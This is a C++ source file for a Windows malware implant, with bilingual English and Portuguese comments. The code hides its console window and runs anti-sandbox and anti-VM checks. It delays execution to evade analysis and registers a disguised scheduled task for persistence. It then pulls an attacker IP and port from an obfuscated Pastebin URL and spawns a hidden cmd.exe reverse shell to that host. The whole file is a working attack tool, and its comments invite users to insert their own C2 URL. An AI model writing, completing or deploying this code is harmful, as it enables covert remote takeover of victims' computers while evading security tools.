#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

// --- CUSTOM MODULE HEADERS / HEADERS DE MÓDULOS CUSTOMIZADOS ---
#include "Obfuscator.hpp"
#include "AntiSandbox.hpp"
#include "DownloadManager.hpp"
#include "PersistenceManager.hpp"

// Function prototype: Notifies the compiler that this function is implemented below
// Protótipo da função: Avisa o compilador que ela existe lá embaixo
void ExecuteReverseShell(const std::string& ip, int port);

// --- MAIN ENTRY POINT / PONTO DE ENTRADA PRINCIPAL ---


int main() {
    
    // --- 1. CONSOLE HIDING / OCULTAÇÃO DA INTERFACE DE CONSOLE ---
    
    // Hides the console window to operate stealthily in the background
    // Oculta a janela do console para operar furtivamente em segundo plano
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);

    
    // --- 2. ACTIVE DEFENSE (ANTI-ANALYSIS) / DEFESA ATIVA (ANTI-ANÁLISE) ---
    
    // Note: Comment out this block when testing in controlled environments to avoid false positives
    // Nota: Se for testar em um ambiente controlado, comente essa parte para evitar falsos positivos
    if (AntiSandbox::IsLowResources() || AntiSandbox::IsSingleCore() || AntiSandbox::IsVirtualMachine()) {
        return 0; 
    }

    
    // --- 3. TIME-BASED EVASION / EVASÃO POR TEMPO ---
    
    // Executes a heavy processing delay to bypass sandboxes with accelerated timers
    // Executa um atraso de processamento pesado para burlar sandboxes com temporizadores acelerados
    AntiSandbox::ExecuteHeavyDelay(120000000); 

    
    // --- 4. PERSISTENCE (TASK SCHEDULER) / PERSISTÊNCIA (AGENDADOR DE TAREFAS) ---
    
    // Retrieves current module path and registers a logon persistence task
    // Obtém o caminho do módulo atual e registra uma tarefa de persistência no logon
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    PersistenceManager::CreateLogonTask(L"WinNetDiagnosticService", szPath);

    
    // --- 5. C2 COMMUNICATION (MEMORY-ONLY) / COMUNICAÇÃO C2 (APENAS EM MEMÓRIA) ---
    
    // Fetches remote execution commands using an obfuscated URL string
    // Busca comandos remotos de execução usando uma string de URL ofuscada
    DownloadManager dl;

    // Replace with your actual URL / Substitua pelo seu URL real
    std::string rawCommand = dl.FetchRemoteCommand(PROTECT("https://pastebin.com/raw/YOUR-PASTEVIN-ID"));

    if (!rawCommand.empty()) {
        
        // --- 6. COMMAND PARSING / PARSING DO COMANDO ---
        
        // Parses the retrieved payload string separated by a pipe character ('|') into IP and Port
        // Analisa a string de payload recuperada separada por um caractere pipe ('|') em IP e Porta
        size_t delimiterPos = rawCommand.find('|');
        if (delimiterPos != std::string::npos) {
            std::string ip = rawCommand.substr(0, delimiterPos);
            int port = std::stoi(rawCommand.substr(delimiterPos + 1));

            
            // --- 7. FINAL PAYLOAD (REVERSE SHELL) / PAYLOAD FINAL (REVERSE SHELL) ---
            
            // Passes parsed parameters directly to trigger the reverse shell connection
            // Passa os parâmetros analisados diretamente para disparar a conexão da reverse shell
            ExecuteReverseShell(ip, port); 
        }
    }
    return 0;
}


// --- REVERSE SHELL EXECUTION / EXECUÇÃO DA REVERSE SHELL ---


// Implementation using modern, secure networking and process creation APIs
// Implementação usando API moderna e segura de rede e criação de processos
void ExecuteReverseShell(const std::string& ip, int port) {
    WSADATA wsaData;
    // Initialize Winsock version 2.2
    // Inicializa o Winsock versão 2.2
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;

    // Create a raw TCP socket
    // Cria um socket TCP bruto
    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(static_cast<unsigned short>(port));
    
    // Convert IP string representation to binary structure using inet_pton
    // Converte a representação em string do IP para estrutura binária usando inet_pton
    if (inet_pton(AF_INET, ip.c_str(), &addr.sin_addr) <= 0) {
        closesocket(s);
        WSACleanup();
        return;
    }

    // Connect to the C2 server address
    // Conecta ao endereço do servidor C2
    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(s);
        WSACleanup();
        return;
    }

    // Configure startup information to redirect I/O streams over the socket handle
    // Configura as informações de inicialização para redirecionar os fluxos de E/S sobre o handle do socket
    STARTUPINFOA sinfo;
    PROCESS_INFORMATION pinfo;
    SecureZeroMemory(&sinfo, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)s;
    sinfo.wShowWindow = SW_HIDE;

    // Spawn a hidden command shell instance bound to the network socket
    // Inicializa uma instância oculta do interpretador de comandos vinculada ao socket de rede
    char cmdPath[] = "cmd.exe";
    if (CreateProcessA(NULL, cmdPath, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
    }
}